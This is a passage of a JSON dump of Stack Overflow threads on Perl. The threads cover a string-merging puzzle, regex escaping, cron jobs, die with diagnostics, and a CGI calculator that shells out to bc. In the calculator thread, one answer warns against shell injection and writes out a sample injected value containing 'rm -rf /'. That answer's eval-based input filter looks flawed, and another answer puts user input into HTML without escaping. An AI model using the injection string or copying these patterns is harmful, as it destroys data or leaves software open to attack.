intentional. Comparing just the &lt;strike&gt;last&lt;/strike&gt;next char would be wrong. That&#39;s what the OP was doing, and that&#39;s why he wasn&#39;t getting the wrong result. You have to keeping comparing characters until one is different. I explained this in detail in my answer."}], "tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": true, "score": 1, "last_activity_date": 1447086764, "last_edit_date": 1447086764, "creation_date": 1447085686, "answer_id": 33613409, "question_id": 33607163, "link": "https://stackoverflow.com/questions/33607163/perl-morgan-and-a-string/33613409#33613409", "title": "Perl Morgan and a String?", "body": "<p>The problem is in your handling of the equal characters. Take the following example:</p>\n\n<pre><code>ACBA\nBCAB\n</code></pre>\n\n<p>When faced with two identical characters (<code>C</code> in my example), you na\u00efvely chose the one from the first string, but that's not always correct. You need to look ahead to break ties. You may even need to look many characters ahead. In this case, next character after <code>C</code> of the second string is lower than the next character of the first string, so you should take the <code>C</code> from the second string first.</p>\n\n<p>By leaving the strings as strings, a simple string comparison will compare as many characters as needed to determine which character to consume.</p>\n\n<pre><code>sub lexi {\n   my ($str1, $str2) = @_;\n\n   utf8::downgrade($str1);  # Makes sure length() will be fast\n   utf8::downgrade($str2);  # since we only have ASCII letters.\n\n   my $final_string = \"\";\n   while (length($str2) &amp;&amp; length($str1)) {\n      $final_string .= substr($str1 le $str2 ? $str1 : $str2, 0, 1, '');\n   }\n\n   $final_string .= $str1;\n   $final_string .= $str2;\n   print $final_string, \"\\n\";\n}\n</code></pre>\n"}], "owner": {"reputation": 3327, "user_id": 1604311, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/0frKT.jpg?s=128&g=1", "display_name": "Arunesh Singh", "link": "https://stackoverflow.com/users/1604311/arunesh-singh"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 382, "favorite_count": 0, "accepted_answer_id": 33613409, "answer_count": 2, "score": 0, "last_activity_date": 1447086764, "creation_date": 1447065072, "last_edit_date": 1447084990, "question_id": 33607163, "link": "https://stackoverflow.com/questions/33607163/perl-morgan-and-a-string", "title": "Perl Morgan and a String?", "body": "<p>I am trying to solve <a href=\"https://www.hackerrank.com/challenges/morgan-and-a-string/copy-from/15097578\" rel=\"nofollow\">this</a> problem on hackerrank:</p>\n\n<p>So the problem is: </p>\n\n<p><em>Jack and Daniel are friends. Both of them like letters, especially upper-case ones. \nThey are cutting upper-case letters from newspapers, and each one of them has their collection of letters stored in separate stacks. \nOne beautiful day, Morgan visited Jack and Daniel. He saw their collections. Morgan wondered what is the lexicographically minimal string, made of that two collections. He can take a letter from a collection when it is on the top of the stack.\nAlso, Morgan wants to use all the letters in the boys' collections.</em> </p>\n\n<p>This is my attempt in Perl:</p>\n\n<pre><code>#!/usr/bin/perl\nuse strict;\nuse warnings;\nchomp(my $n=&lt;&gt;);\nwhile($n&gt;0){\n    chomp(my $string1=&lt;&gt;);\n    chomp(my $string2=&lt;&gt;);\n    lexi($string1,$string2);\n    $n--;\n}\nsub lexi{\n   my($str1,$str2)=@_;\n   my @str1=split(//,$str1);\n   my @str2=split(//,$str2);\n   my $final_string=\"\";\n\n   while(@str2 &amp;&amp; @str1){\n       my $st2=$str2[0];\n       my $st1=$str1[0];\n       if($st1 le $st2){\n         $final_string.=$st1;\n         shift @str1;\n       }\n       else{\n          $final_string.=$st2;\n          shift @str2;\n       }\n  }\n  if(@str1){\n       $final_string=$final_string.join('',@str1);\n  }\n  else{\n       $final_string=$final_string.join('',@str2);\n  }\n  print $final_string,\"\\n\";\n}\n</code></pre>\n\n<p><strong>Sample Input:</strong></p>\n\n<pre><code>2\nJACK\nDANIEL\nABACABA\nABACABA\n</code></pre>\n\n<p>The first line contains the number of test cases, T. \nEvery next two lines have such format: the first line contains string A, and the second line contains string B.</p>\n\n<p><strong>Sample Output:</strong></p>\n\n<pre><code>DAJACKNIEL\nAABABACABACABA\n</code></pre>\n\n<p>But for <em>Sample test-case</em> it is giving <em>right results</em> while it is giving <em>wrong results</em> for <em>other test-cases</em>. One case for which it gives an incorrect result is</p>\n\n<pre><code>1\nAABAC\nAACAB\n</code></pre>\n\n<p>It outputs <code>AAAABACCAB</code> instead of <code>AAAABACABC</code>.</p>\n\n<p>I don't know what is wrong with the algorithm and why it is failing with other test cases?</p>\n\n<p><strong>Update:</strong></p>\n\n<p>As per @squeamishossifrage comments If I add </p>\n\n<pre><code>($str1,$str2)=sort{$a cmp $b}($str1,$str2);\n</code></pre>\n\n<p>The results become same irrespective of user-inputs but still the test-case fails.</p>\n"}, {"tags": ["python", "perl", "grep", "awk", "regex"], "answers": [{"tags": [], "owner": {"reputation": 405, "user_id": 5616052, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8b5baa4a556b7186105090655744093a?s=128&d=identicon&r=PG&f=1", "display_name": "Law29", "link": "https://stackoverflow.com/users/5616052/law29"}, "is_accepted": false, "score": 1, "last_activity_date": 1447095458, "creation_date": 1447065501, "answer_id": 33780874, "question_id": 33780873, "link": "https://stackoverflow.com/questions/33780873/check-for-occurrence-of-in-a-complex-string/33780874#33780874", "title": "check for occurrence of | in a complex string", "body": "<p>Try putting a backslash <kbd>\\</kbd> in front of the pipe <kbd>|</kbd> that you want to find.</p>\n\n<p>For example, <code>egrep '\\|\\|'</code> will match your example of an invalid rule but not your example of a valid rule.</p>\n\n<p>Watch out for basic and extended regular expressions (BRE and ERE), you need a backslash for ERE but not for BRE. grep uses BRE, egrep and awk and python and perl use ERE as far as the pipe character is concerned, sed uses BRE unless you have and use the <code>-r</code> option for ERE.</p>\n"}], "migrated_from": {"other_site": {"markdown_extensions": ["Prettify"], "launch_date": 1243296000, "open_beta_date": 1241049600, "site_state": "normal", "high_resolution_icon_url": "https://cdn.sstatic.net/Sites/serverfault/Img/apple-touch-icon@2.png", "twitter_account": "ServerFault", "favicon_url": "https://cdn.sstatic.net/Sites/serverfault/Img/favicon.ico", "icon_url": "https://cdn.sstatic.net/Sites/serverfault/Img/apple-touch-icon.png", "audience": "system and network administrators", "site_url": "https://serverfault.com", "api_site_parameter": "serverfault", "logo_url": "https://cdn.sstatic.net/Sites/serverfault/Img/logo.png", "name": "Server Fault", "site_type": "main_site"}, "on_date": 1447851902, "question_id": 734911}, "owner": {"reputation": 303, "user_id": 2576908, "user_type": "registered", "accept_rate": 43, "profile_image": "https://i.stack.imgur.com/eRIQE.jpg?s=128&g=1", "display_name": "Anoop P Alias", "link": "https://stackoverflow.com/users/2576908/anoop-p-alias"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 41, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1449075402, "creation_date": 1447062610, "last_edit_date": 1449075402, "question_id": 33780873, "link": "https://stackoverflow.com/questions/33780873/check-for-occurrence-of-in-a-complex-string", "title": "check for occurrence of | in a complex string", "body": "<p>The basic requirement is that I need to find the occurrence of <code>|</code> in <code>BasicRule</code> of NAXSI web application firewall whitelist</p>\n\n<pre><code>BasicRule  wl:1015 \"mz:$URL:/js/));Nt.optgroup=Nt.option,Nt.tbody=Nt.tfoot=Nt.colgroup=Nt.caption=Nt.thead,Nt.th=Nt.td,v.support.htmlSerialize||(Nt._default=[1,|URL\";\n</code></pre>\n\n<p>is invalid rule because of the <code>||</code> in the <code>$URL</code> regular expression</p>\n\n<pre><code>BasicRule  wl:1015 \"mz:$URL:/js/));Nt.optgroup=Nt.option,Nt.tbody=Nt.tfoot=Nt.colgroup=Nt.caption=Nt.thead,Nt.th=Nt.td,v.support.htmlSerialize(Nt._default=[1,|URL\";\n</code></pre>\n\n<p>is valid </p>\n\n<p>NAXSI whitelists are of syntax as described in <a href=\"https://github.com/nbs-system/naxsi/wiki/whitelists\" rel=\"nofollow\">https://github.com/nbs-system/naxsi/wiki/whitelists</a></p>\n\n<p>What is the easy way to check if this condition match in <code>egrep</code>/<code>sed</code>/<code>awk</code>/<code>perl</code>/<code>python</code> for example   </p>\n"}, {"tags": ["perl", "cron", "crontab"], "comments": [{"owner": {"reputation": 3327, "user_id": 1604311, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/0frKT.jpg?s=128&g=1", "display_name": "Arunesh Singh", "link": "https://stackoverflow.com/users/1604311/arunesh-singh"}, "edited": false, "score": 0, "creation_date": 1447061430, "post_id": 33605762, "comment_id": 54986778, "body": "Your path to Perl script is <code>&#47;public_html&#47;Staging&#47;ff</code> or <code>public_html&#47;Staging&#47;ff</code>. There is subtle difference between them. First one is <code>absolute path</code> second one is <code>relative path</code> w.r.t your current directory.They may be same or may not be so, please verify the exact location of your Perl script and try to run it manually first."}, {"owner": {"reputation": 99, "user_id": 4988805, "user_type": "registered", "accept_rate": 45, "profile_image": "https://www.gravatar.com/avatar/32af98e23ffe17c014821ad169cf59aa?s=128&d=identicon&r=PG&f=1", "display_name": "Loura", "link": "https://stackoverflow.com/users/4988805/loura"}, "reply_to_user": {"reputation": 3327, "user_id": 1604311, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/0frKT.jpg?s=128&g=1", "display_name": "Arunesh Singh", "link": "https://stackoverflow.com/users/1604311/arunesh-singh"}, "edited": false, "score": 0, "creation_date": 1447061944, "post_id": 33605762, "comment_id": 54987043, "body": "Thanks for your time.. relative path actually worked fine."}, {"owner": {"reputation": 99, "user_id": 4988805, "user_type": "registered", "accept_rate": 45, "profile_image": "https://www.gravatar.com/avatar/32af98e23ffe17c014821ad169cf59aa?s=128&d=identicon&r=PG&f=1", "display_name": "Loura", "link": "https://stackoverflow.com/users/4988805/loura"}, "reply_to_user": {"reputation": 3327, "user_id": 1604311, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/0frKT.jpg?s=128&g=1", "display_name": "Arunesh Singh", "link": "https://stackoverflow.com/users/1604311/arunesh-singh"}, "edited": false, "score": 0, "creation_date": 1447062123, "post_id": 33605762, "comment_id": 54987150, "body": "How do i stop this process?"}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1447064336, "post_id": 33605762, "comment_id": 54988384, "body": "<code>kill</code> typically. Or amend your <code>crontab</code> again."}, {"owner": {"reputation": 99, "user_id": 4988805, "user_type": "registered", "accept_rate": 45, "profile_image": "https://www.gravatar.com/avatar/32af98e23ffe17c014821ad169cf59aa?s=128&d=identicon&r=PG&f=1", "display_name": "Loura", "link": "https://stackoverflow.com/users/4988805/loura"}, "edited": false, "score": 0, "creation_date": 1447064953, "post_id": 33605762, "comment_id": 54988731, "body": "could not find the way to kill my process. Its running still :("}, {"owner": {"reputation": 3327, "user_id": 1604311, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/0frKT.jpg?s=128&g=1", "display_name": "Arunesh Singh", "link": "https://stackoverflow.com/users/1604311/arunesh-singh"}, "edited": false, "score": 0, "creation_date": 1447065443, "post_id": 33605762, "comment_id": 54989043, "body": "check <a href=\"http://askubuntu.com/questions/313033/how-can-i-see-stop-current-running-crontab-tasks\">this</a>"}, {"owner": {"reputation": 99, "user_id": 4988805, "user_type": "registered", "accept_rate": 45, "profile_image": "https://www.gravatar.com/avatar/32af98e23ffe17c014821ad169cf59aa?s=128&d=identicon&r=PG&f=1", "display_name": "Loura", "link": "https://stackoverflow.com/users/4988805/loura"}, "edited": false, "score": 0, "creation_date": 1447827321, "post_id": 33605762, "comment_id": 55313029, "body": "seriously couldnt find way to stop.  do i have to add new cron job as just <code>kill</code>? even though if i delete my cron job, its still running"}], "owner": {"reputation": 99, "user_id": 4988805, "user_type": "registered", "accept_rate": 45, "profile_image": "https://www.gravatar.com/avatar/32af98e23ffe17c014821ad169cf59aa?s=128&d=identicon&r=PG&f=1", "display_name": "Loura", "link": "https://stackoverflow.com/users/4988805/loura"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 409, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1447063999, "creation_date": 1447060406, "last_edit_date": 1447063999, "question_id": 33605762, "link": "https://stackoverflow.com/questions/33605762/run-and-stop-perl-script-from-cron-job-cpanel", "title": "run and stop perl script from cron job - cpanel", "body": "<p>My path to the perl script is</p>\n\n<pre><code>public_html/Staging/ff/sendmail.pl\n</code></pre>\n\n<p>The command to run the perl script in cron job cpanel is</p>\n\n<pre><code>cd /public_html/Staging/ff; perl sendmail.pl &gt;/dev/null\n</code></pre>\n\n<p><a href=\"https://i.stack.imgur.com/jO4Vp.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/jO4Vp.png\" alt=\"enter image description here\"></a></p>\n\n<p>is set to every 1 min, which is not working. What could be the issue? And how to stop the same process</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 0, "creation_date": 1447052784, "post_id": 33603570, "comment_id": 54982686, "body": "How are you running this script? This message is likely added by whatever environment you&#39;re running the code in."}, {"owner": {"reputation": 5338, "user_id": 4594973, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/USV9e.jpg?s=128&g=1", "display_name": "code_dredd", "link": "https://stackoverflow.com/users/4594973/code-dredd"}, "reply_to_user": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 0, "creation_date": 1447053468, "post_id": 33603570, "comment_id": 54982955, "body": "@melpomene: I don&#39;t think that&#39;s true. He already mentioned what his environment is. My environment (GNU/Linux) is different from his Windows-based Strawberry Perl setup and I was still able to easily reproduce the behavior. Please see the docs on <code>die</code>, which mentions it raises an exception. His code is clearly not handling it, hence the message. Please see <a href=\"https://stackoverflow.com/questions/33603570/why-does-perl-show-an-uncaught-exception-from-user-code-line-here/33603629#33603629\">my post</a> for more info."}, {"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "reply_to_user": {"reputation": 5338, "user_id": 4594973, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/USV9e.jpg?s=128&g=1", "display_name": "code_dredd", "link": "https://stackoverflow.com/users/4594973/code-dredd"}, "edited": false, "score": 0, "creation_date": 1447054989, "post_id": 33603570, "comment_id": 54983594, "body": "@ray I wasn&#39;t asking about about the environment. But I was indeed missing the <code>use diagnostics</code> line. Sorry about the distraction."}], "answers": [{"comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1447072350, "post_id": 33603629, "comment_id": 54992857, "body": "<code>die</code> is perfectly appropriate. Just don&#39;t leave <code>use diagnostics;</code> in outside of debugging. In fact, you should probably never have <code>use diagnostics;</code> in the code. Just use <code>perl -Mdiagnostics ...</code> when you want to figure out what a warning means."}], "tags": [], "owner": {"reputation": 5338, "user_id": 4594973, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/USV9e.jpg?s=128&g=1", "display_name": "code_dredd", "link": "https://stackoverflow.com/users/4594973/code-dredd"}, "is_accepted": false, "score": 2, "last_activity_date": 1447073166, "last_edit_date": 1447073166, "creation_date": 1447050878, "answer_id": 33603629, "question_id": 33603570, "link": "https://stackoverflow.com/questions/33603570/why-does-perl-show-an-uncaught-exception-from-user-code-line-here/33603629#33603629", "title": "Why does Perl show an &quot;Uncaught exception from user code&quot; line here?", "body": "<p>The exception message is caused by the <code>die</code> function call in combination with the loaded <code>diagnostics</code> module, which adds more verbose information.</p>\n\n<p>You should consider using the following instead:</p>\n\n<pre><code>print \"Go away! Imposter!\\n\";\nexit 1;\n</code></pre>\n\n<p>Quoting from the <a href=\"http://perldoc.perl.org/functions/die.html\" rel=\"nofollow\">Perl docs</a>, my emphasis added:</p>\n\n<blockquote>\n  <p><code>die</code> <strong>raises an exception</strong>. Inside an eval the error message is stuffed\n  into <code>$@</code> and the <code>eval</code> is terminated with the undefined value. <strong>If the\n  exception is outside of all enclosing evals, then the uncaught\n  exception prints <code>LIST</code> to <code>STDERR</code> and exits with a non-zero value.</strong> If\n  you need to exit the process with a specific exit code, see exit.</p>\n</blockquote>\n\n<p>Your <code>die</code> call is outside eval statements, so it prints the message and exits due to an unhandled exception.</p>\n"}, {"tags": [], "owner": {"reputation": 126333, "user_id": 14660, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/e55e0ec3c00f834d78fbdddeaa36e308?s=128&d=identicon&r=PG", "display_name": "Schwern", "link": "https://stackoverflow.com/users/14660/schwern"}, "is_accepted": false, "score": 4, "last_activity_date": 1447053990, "creation_date": 1447053990, "answer_id": 33604260, "question_id": 33603570, "link": "https://stackoverflow.com/questions/33603570/why-does-perl-show-an-uncaught-exception-from-user-code-line-here/33604260#33604260", "title": "Why does Perl show an &quot;Uncaught exception from user code&quot; line here?", "body": "<blockquote>\n  <p><strong><em>Why do I get that line \"uncaught exception from user code\"?</em></strong></p>\n</blockquote>\n\n<p>It is because you loaded the <a href=\"https://metacpan.org/pod/diagnostics\" rel=\"nofollow\">diagnostics</a> module with <code>use diagnostics</code>. It is annotating warnings and errors with explanations, in this case your call to <code>die</code>.</p>\n\n<pre><code>$ perl -wle 'die \"foo\"'\nfoo at -e line 1.\n\n$ perl -wle 'use diagnostics; die \"foo\"'\nUncaught exception from user code:\n    foo at -e line 1.\n</code></pre>\n"}], "owner": {"reputation": 21, "user_id": 5541200, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2249c279e3ace73af28176080ea8b0be?s=128&d=identicon&r=PG", "display_name": "InternetDominus", "link": "https://stackoverflow.com/users/5541200/internetdominus"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1440, "favorite_count": 0, "answer_count": 2, "score": 2, "last_activity_date": 1447073166, "creation_date": 1447050550, "last_edit_date": 1447052806, "question_id": 33603570, "link": "https://stackoverflow.com/questions/33603570/why-does-perl-show-an-uncaught-exception-from-user-code-line-here", "title": "Why does Perl show an &quot;Uncaught exception from user code&quot; line here?", "body": "<p>Learning Perl here.</p>\n\n<p>I am using Strawberry Perl 5 version 22.</p>\n\n<p>I have this script that is supposed to ask for a password, and tell if I got the right password or go away, and when I type in a wrong password, I get this warning \"<strong>uncaught exception from user code</strong>\"</p>\n\n<p>My script is:</p>\n\n<pre><code>#!D:/perl/perl/bin/perl.exe -wT\n# Script name = password.pl\nuse strict;\nuse warnings;\nuse diagnostics;\n\nmy $password = \"foxtrot\";\nprint \"Enter password: \";\nmy $guess = &lt;STDIN&gt;;\nchomp $guess;\nif  ($password eq $guess) {\n    print \"Pass, friend.\\n\";\n}\nif ($password ne $guess) {\n    die \"Go away! imposter!\\n\";\n}\n</code></pre>\n\n<p>When I enter any word that is not foxtrot, I get:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>Uncaught exception from user code\nGo away! imposter!\n</code></pre>\n\n<p>Why do I get that line \"uncaught exception from user code\"?</p>\n"}, {"tags": ["perl", "shell", "bc"], "comments": [{"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 5, "creation_date": 1447047502, "post_id": 33603042, "comment_id": 54981281, "body": "You want backticks or <code>qx&#47;&#47;</code>. But... you know that Perl can do math, right?"}, {"owner": {"reputation": 113, "user_id": 1005576, "user_type": "registered", "accept_rate": 22, "profile_image": "https://www.gravatar.com/avatar/1ce02152ee5c8c30b760be615a34b401?s=128&d=identicon&r=PG", "display_name": "Sumit Raj", "link": "https://stackoverflow.com/users/1005576/sumit-raj"}, "reply_to_user": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 0, "creation_date": 1447048083, "post_id": 33603042, "comment_id": 54981410, "body": "Thanks a lot Matt, that&#39;s what I needed. Worked"}, {"owner": {"reputation": 137100, "user_id": 874188, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/ZcY77.png?s=128&g=1", "display_name": "tripleee", "link": "https://stackoverflow.com/users/874188/tripleee"}, "edited": false, "score": 2, "creation_date": 1447049975, "post_id": 33603042, "comment_id": 54981848, "body": "<code>bc</code> is a shell command, not a Perl command.  A much better approach would be to use Perl&#39;s built-in facilities, like <code>print &quot;&lt;td&gt;&quot;, 56.8+77.7, &quot;&lt;&#47;td&gt;&lt;&#47;tr&gt;\\n&quot;;</code>"}, {"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "reply_to_user": {"reputation": 137100, "user_id": 874188, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/ZcY77.png?s=128&g=1", "display_name": "tripleee", "link": "https://stackoverflow.com/users/874188/tripleee"}, "edited": false, "score": 2, "creation_date": 1447057639, "post_id": 33603042, "comment_id": 54984715, "body": "@tripleee Ah, but this is a CGI calculator. Strap yourselves in, guys, we&#39;re going to pass GET parameters to the shell!"}, {"owner": {"reputation": 137100, "user_id": 874188, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/ZcY77.png?s=128&g=1", "display_name": "tripleee", "link": "https://stackoverflow.com/users/874188/tripleee"}, "reply_to_user": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 0, "creation_date": 1447057795, "post_id": 33603042, "comment_id": 54984785, "body": "@melpomene Rather than post rhetoric, it would be helpful if you explained to the OP why this is a really, really, really bad idea."}], "answers": [{"comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1447072717, "post_id": 33606487, "comment_id": 54993046, "body": "Completely backwards. Using <code>bc</code> is far more safe than using <code>Perl</code>. Re &quot;As an example - imagine if someone entered an expression:&quot;, That&#39;s due to a buggy Perl program, not the use of <code>bc</code>."}], "tags": [], "owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "is_accepted": false, "score": 4, "last_activity_date": 1447073186, "last_edit_date": 1447073186, "creation_date": 1447062946, "answer_id": 33606487, "question_id": 33603042, "link": "https://stackoverflow.com/questions/33603042/how-to-use-bc-command-of-perl-inside-perl-script/33606487#33606487", "title": "How to use bc command of perl inside perl script?", "body": "<p>OK, so <code>bc</code> is a unix utility that lets you do maths. You can execute utility commands via the <code>qx</code> operator, or backticks.</p>\n\n<p>However, in this case ... it's a bad idea, because it's a) unnecessary and b) presents a security risk. Why? Because you're passing user input from a web form, into a shell, which leaves you with a selection of injection exploits.</p>\n\n<p>Why not instead:</p>\n\n<pre><code>my $res = 56.8 + 77.7;\n</code></pre>\n\n<p>Whilst you're at it, you really should:</p>\n\n<ul>\n<li>turn on <code>use strict;</code></li>\n<li>turn on <code>use warnings;</code> </li>\n<li>turn on <a href=\"http://perldoc.perl.org/perlsec.html#Taint-mode\" rel=\"nofollow\">\"taint\"</a> mode. (add a <code>-T</code> to your shebang line). </li>\n</ul>\n\n<p>This will reduce your chance of 'bad stuff' happening via code injection. When you switch on 'taint' mode, it marks any user input at 'tainted' and will not let you use it for certain commands without sanitising it first.</p>\n\n<p>As an example - imagine if someone entered an expression:</p>\n\n<pre><code>4\"; rm -rf /; echo \"owned \n</code></pre>\n\n<p>Your backticks to evaluate it would then become;</p>\n\n<pre><code>echo \"4\";rm -rf /; echo \"owned\" | bc -l\n</code></pre>\n\n<p>I'd imagine you can see how that's going to be bad news!</p>\n\n<p>So you really shouldn't -ever- pass through user input to execute like that. You should also be quite cautious with eval. Using a regular expression to ensure your operation is 'just' mathematical in nature:</p>\n\n<pre><code> unless ( $str =~ /[^0-9+-*^/.,_()]/ ) {\n     eval ( $str );\n }\n</code></pre>\n\n<p>(Modules may also exist for this purpose)</p>\n\n<p>Or:</p>\n\n<pre><code>my $eval_str = \"5 + bogus; nonsense; here 210\";\n\n$eval_str =~ s{[^0-9\\+\\-\\/\\=\\/]+}{}g;\nprint $eval_str;\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "is_accepted": false, "score": 0, "last_activity_date": 1447067214, "creation_date": 1447067214, "answer_id": 33607788, "question_id": 33603042, "link": "https://stackoverflow.com/questions/33603042/how-to-use-bc-command-of-perl-inside-perl-script/33607788#33607788", "title": "How to use bc command of perl inside perl script?", "body": "<p>As others have pointed out, you can do your calculations in Perl. There's no need to call <code>bc</code>.</p>\n\n<p>But I wanted to look a little closer at the way you're producing your output. You're using a mass of <code>print()</code> statements. And there are far better approaches.</p>\n\n<p>Firstly, you have statements that look like this:</p>\n\n<pre><code>print \"&lt;table border=\\\"0\\\"&gt;\\n\";\n</code></pre>\n\n<p>I know why you have the backslashes there, but doesn't it look ugly to you? You need to escape double-quote characters in double-quoted strings for obvious reasons. But Perl has the <code>qq[...]</code> operator for cases like this:</p>\n\n<pre><code>print qq[&lt;table border=\"0\"&gt;\\n];\n</code></pre>\n\n<p><code>qq[...]</code> works just like a double-quoted string but because it doesn't use double-quote characters to delimit the string you don't need to escape the double-quote characters inside the string. Note that you don't even need to use <code>[...]</code> to delimit the string. You can use almost any character - <code>qq(...)</code>, <code>qq|...|</code> and many other options work just as well.</p>\n\n<p>Secondly, why have a separate <code>print()</code> statement for each line. Whu not combine them into a single <code>print()</code> statement?</p>\n\n<pre><code>print qq[Content-Type: text/html\n\n&lt;html&gt;&lt;body&gt;\n&lt;b&gt;Calculator:&lt;/b&gt;&lt;br/&gt;\n&lt;form action=\"/cgi-bin/calc.cgi\" method=\"GET\"&gt;\n&lt;table border=\"0\"&gt;\n&lt;tr&gt;&lt;td align=\"right\"&gt;Expression:&lt;/td&gt;\n&lt;td&gt;&lt;input type=\"text\" name=\"exp\"\n value=\"$exp\"/&gt;&lt;/td&gt;&lt;/tr&gt;\n&lt;tr&gt;&lt;td align=\"right\"&gt;Result:&lt;/td&gt;\n&lt;td&gt;$res&lt;/td&gt;&lt;/tr&gt;\n&lt;tr&gt;&lt;td&gt;&lt;/td&gt;\n&lt;td&gt;&lt;input type=\"submit\" value=\"Evaluate\"/&gt;&lt;/td&gt;&lt;/tr&gt;\n&lt;/table&gt;&lt;/form&gt;\n&lt;/html&gt;&lt;/body&gt;];\n</code></pre>\n\n<p>Notice how you can lose all the explicit <code>\\n</code> and replace them with real newlines embedded in the string. Doesn't that look neater?</p>\n\n<p>In fact most Perl programmers would take that a step further and use a \"heredoc\" for this:</p>\n\n<pre><code>print &lt;&lt;\"ENDHTML\";\nContent-Type: text/html\n\n&lt;html&gt;&lt;body&gt;\n&lt;b&gt;Calculator:&lt;/b&gt;&lt;br/&gt;\n&lt;form action=\"/cgi-bin/calc.cgi\" method=\"GET\"&gt;\n&lt;table border=\"0\"&gt;\n&lt;tr&gt;&lt;td align=\"right\"&gt;Expression:&lt;/td&gt;\n&lt;td&gt;&lt;input type=\"text\" name=\"exp\"\n value=\"$exp\"/&gt;&lt;/td&gt;&lt;/tr&gt;\n&lt;tr&gt;&lt;td align=\"right\"&gt;Result:&lt;/td&gt;\n&lt;td&gt;$res&lt;/td&gt;&lt;/tr&gt;\n&lt;tr&gt;&lt;td&gt;&lt;/td&gt;\n&lt;td&gt;&lt;input type=\"submit\" 